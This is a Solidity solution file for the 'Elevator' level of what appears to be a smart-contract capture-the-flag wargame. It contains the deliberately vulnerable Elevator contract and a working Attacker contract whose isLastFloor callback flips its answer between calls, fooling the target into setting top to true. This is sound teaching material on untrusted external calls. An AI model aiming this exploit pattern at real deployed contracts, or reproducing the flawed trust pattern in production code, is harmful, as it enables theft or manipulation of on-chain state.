//////////////////////////////////////
// Level 11 - Elevator
// By: Lorenzo Cesconetto
//////////////////////////////////////

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint) external returns (bool);
}

contract Elevator {
    bool public top;
    uint public floor;

    function goTo(uint _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}

// SOLUTION:
// External calls to third-party contracts have no guarantee to be properly implemented.
// Despite of its interface or what it claims to be doing.
// Just deploy the Attacker contract and call its function attack();
contract Attacker is Building {
    Elevator constant target =
        Elevator(0xc0aA9B350774019B8e8e64c19c6635dEF0D2efA0);
    bool private response;

    function attack() external {
        target.goTo(10);
    }

    function isLastFloor(uint _doesntMatter) external returns (bool) {
        // The first time it
        bool tmp = response;
        response = !response;
        return tmp;
    }
}
